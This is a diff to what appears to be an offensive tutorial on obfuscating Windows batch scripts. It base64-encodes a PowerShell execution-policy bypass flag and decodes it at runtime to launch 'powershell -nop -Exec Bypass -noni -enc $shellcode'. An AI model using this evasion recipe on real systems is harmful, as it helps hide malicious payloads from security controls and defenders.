@@ -148,27 +148,27 @@ The above string can be obfuscated using the **batch special character: ^** <br 
 <br />
 
 - String command to obfuscate<br />
-`-Exec Bypass`
+`Exec Bypass`
 
 - using base64 to decode the encoded syscall
 
       1º - encode the command you want to obfuscate
-      echo "-Exec Bypass" | base64
+      echo "Exec Bypass" | base64
 
       2º - copy the encoded string to paste it on your script
-      LUV4ZWMgQnlwYXNzCg==
+      RXhlYyBCeXBhc3MK
 
       3º - Insert the follow lines into your batch script
 
         @echo off
-        set syscall=LUV4ZWMgQnlwYXNzCg==
+        set syscall=RXhlYyBCeXBhc3MK
           #
           # REMARK: to test on terminal remove the extra % from %%i
-          # REMARK: If local var can't be accessed from cmd, setX syscall LUV4ZWMgQnlwYXNzCg==
+          # REMARK: If local var can't be accessed from cmd, setX syscall RXhlYyBCeXBhc3MK
           # https://serverfault.com/questions/349585/how-do-i-set-an-environmental-variable-from-a-powershell-command
           #
           for /F "usebackq tokens=1" %%i in (`powershell ^([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($env:syscall))^)`) do set decoded=%%i
-        cmd.exe /c powershell.exe -nop %decoded% -noni -enc $shellcode ::<-- execute/decode the base64 syscall at runtime
+        cmd.exe /c powershell.exe -nop -%decoded% -noni -enc $shellcode ::<-- execute/decode the base64 syscall at runtime
 
 ![batch obfuscation](http://i.)
 
